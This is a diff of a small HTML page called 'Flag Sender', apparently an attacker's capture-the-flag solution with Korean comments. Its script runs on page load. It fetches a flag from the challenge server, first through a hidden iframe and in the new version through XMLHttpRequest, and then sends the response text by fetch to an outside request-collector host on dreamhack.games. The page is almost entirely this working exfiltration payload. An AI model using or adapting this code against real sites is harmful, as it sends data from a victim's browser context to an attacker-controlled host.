@@ -3,34 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Flag Sender</title>
+    <title>Flag Sender3</title>
 </head>
 <body>
-    <h1>Flag Sender1444</h1>
+    <h1>Flag Sender</h1>
     <script>
-        const baseFlag = 'hspace'; // 고정된 FLAG 부분
-
         const sendFlag = () => {
-            const requestUrl = `https://localhost/flag?flag=${encodeURIComponent(baseFlag)}`;
-            const iframe = document.createElement('iframe');
+            const requestUrl = 'http://war.sschall.xyz:60001/flag';
+            const xhr = new XMLHttpRequest();
 
-            iframe.style.display = 'none'; // iframe을 보이지 않게 설정
-            iframe.src = requestUrl;
+            xhr.open('GET', requestUrl, true);
+            xhr.onload = function () {
+                if (xhr.status >= 200 && xhr.status < 300) {
+                    const responseText = xhr.responseText;
 
-            // iframe이 로드된 후의 처리
-            iframe.onload = function () {
-                const responseText = iframe.contentDocument.body.textContent; // 응답 텍스트 가져오기
-                console.log(`Requesting: ${requestUrl}`); // 요청 로그
-                console.log(`Response: ${responseText}`); // 응답 로그
+                    console.log(`Requesting: ${requestUrl}`); // 요청 로그
+                    console.log(`Response: ${responseText}`); // 응답 로그
 
-                // 최종 요청 보내기 (응답 text를 파라미터로 사용)
-                const finalRequestUrl = `https://xuovmol.request.dreamhack.games?flag=${encodeURIComponent(responseText)}`;
-                fetch(finalRequestUrl); // 응답을 기다리지 않고 요청만 보냄
+                    // 최종 요청 보내기 (응답 text를 파라미터로 사용)
+                    const finalRequestUrl = `https://ioegaam.request.dreamhack.games?flag=${encodeURIComponent(responseText)}`;
+                    fetch(finalRequestUrl); // 응답을 기다리지 않고 요청만 보냄
 
-                console.log('Final FLAG sent:', responseText);
+                    console.log('Final FLAG sent:', responseText);
+                } else {
+                    console.error('Request failed:', xhr.statusText);
+                }
             };
 
-            document.body.appendChild(iframe); // iframe을 문서에 추가하여 요청 시작
+            xhr.onerror = function () {
+                console.error('Network error');
+            };
+
+            xhr.send();
         };
 
         sendFlag();
